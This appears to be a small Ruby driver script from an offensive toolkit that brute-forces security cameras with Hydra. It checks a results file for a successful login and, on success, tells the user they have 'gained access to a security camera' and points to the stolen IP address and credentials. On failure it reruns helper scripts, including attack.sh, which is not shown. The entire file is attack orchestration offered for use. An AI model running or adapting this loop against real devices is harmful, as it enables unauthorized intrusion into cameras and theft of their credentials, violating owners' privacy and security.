#!/bin/ruby

finder = system("grep successfully checkthisfile.txt") #Check for success of Hydra attack

if finder == true
  print "Great! You have successfully gained access to a security camera! Please open 'checkthisfile.txt', for the IP address of the camera, as well as the credentials.
"
  system("chmod +x removefirstline.sh")
  system("./removefirstline.sh")
else
  system("chmod +x removefirstline.sh")
  system("./removefirstline.sh")
  system("chmod +x attack.sh")
  system("./attack.sh")
end
